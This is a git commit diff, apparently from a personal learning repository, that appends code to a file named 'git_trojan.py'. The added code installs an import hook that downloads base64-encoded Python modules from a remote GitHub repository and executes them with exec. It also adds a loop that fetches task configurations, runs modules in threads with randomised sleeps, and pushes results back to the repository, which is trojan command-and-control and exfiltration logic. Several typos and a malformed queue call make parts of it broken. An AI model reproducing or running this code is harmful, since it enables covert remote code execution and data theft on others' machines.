7aefe9fe654224bf9f5645df4f694c5d64836d55
96n <takecchit97@gmail.com>
2016-09-16 23:00:10 +0900

    Appending new code to git_trojan.py

--- git_trojan.py
+++ git_trojan.py
@@ -58,3 +58,50 @@ def store_modules_result(date):
 	repo.create_file(remote_path, 'commit message', base64.b64encode(data))
 
 	return
+
+
+class GitImporter(object):
+	def __init__(self):
+		self.currrent_module_code = ''
+
+	def find_module(self, fullname, path=None):
+		if configured:
+			print "[*] Attempting to retrieve %s" % fullname
+			new_library = get_filie_contents("modules/%s" % fullname)
+
+			if new_library is not None:
+				self.currrent_module_code = base64.b64decode(new_library)
+				return self
+		return None
+
+	def load_module(self, name):
+		module = imp.new_module(name)
+		exec self.currrent_module_code in module.__dict__
+		sys.modules[name] = module
+
+		return module
+
+
+def module_runner(module):
+	task_queue.put[1]
+	result = sys.modules[module].run()
+	task_queue.get()
+
+	store_modules_result(result)
+
+	return
+
+if __name__ == "__main__":
+	sys.meta_path = [GitImporter()]
+
+	while True:
+		if task_queue.empty():
+			config = get_trojan_config()
+
+			for task in config:
+				t = threading.Thread(target=module_runner, args=(task['module'],))
+				t.start()
+				time.sleep(random.randint(1, 10))
+
+		time.sleep(random.randint(1000, 10000))
+
